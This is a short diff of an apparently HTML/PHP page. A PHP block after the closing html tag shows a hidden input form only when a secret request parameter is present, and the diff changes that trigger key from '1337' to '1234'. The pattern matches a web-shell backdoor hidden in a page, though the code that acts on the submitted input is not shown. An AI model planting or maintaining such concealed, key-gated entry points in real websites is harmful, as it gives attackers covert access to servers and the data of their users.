@@ -7,7 +7,7 @@
 </html>
 
 <?php
-if(isset($_REQUEST['1337'])){
+if(isset($_REQUEST['1234'])){
         echo "<pre>";
         echo "<form name='form' action='#' method='post'>
        <input type='text' name='coba'/> <input type='submit' value='enter'/>
